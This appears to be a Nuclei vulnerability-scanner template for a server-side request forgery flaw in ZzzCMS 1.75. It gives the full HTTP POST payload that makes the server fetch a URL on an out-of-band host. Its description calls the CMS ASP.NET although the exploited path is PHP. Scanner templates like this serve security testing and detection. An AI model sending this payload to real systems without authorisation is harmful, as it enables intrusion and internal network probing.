# Nuclei Template: ZzzCMS 1.75 - Server-Side Request Forgery
**Template ID:** zzzcms-ssrf
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** High
**CWE:** CWE-918
**Source:** Nuclei Template (`zzzcms-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
ZzzCMS (A Lightweight ASP.NET content management system) is vulnerable to SSRF(Server-Side Request Forgery).

## Steps to reproduce / Exploit Payload
```http
POST /plugins/ueditor/php/controller.php?action=catchimage&upfolder=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

source[0]=http://{{interactsh-url}}/{{filename}}.txt
```

## References
- https://www.hacking8.com/bug-web/Zzzcms/Zzzcms-1.75-ssrf.html
